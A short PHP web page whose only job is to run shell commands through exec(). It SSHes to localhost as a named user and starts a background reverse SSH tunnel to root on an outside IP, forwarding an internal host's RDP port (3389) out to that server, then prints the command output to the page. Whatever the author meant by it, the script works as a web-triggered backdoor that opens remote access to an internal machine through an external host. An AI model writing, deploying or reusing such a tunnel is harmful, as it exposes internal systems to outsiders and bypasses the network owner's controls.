<?php
echo exec(pwd);

$cm = 'timeout 3 ssh profi_pankratov_ay@localhost "nohup timeout 1h ssh -C -R 3399:10.248.4.142:3389 root@45.95.202.18 -gN"';



$result = exec("$cm 2>&1", $r2);

echo "<pre>";
echo "\n\n";
echo "------------------------------------------------------";
echo "\n\n";

foreach ($r2 as $line) {
    echo $line . "\n";
}

unset($r2);

echo "\n\n";
echo "------------------------------------------------------";
?>
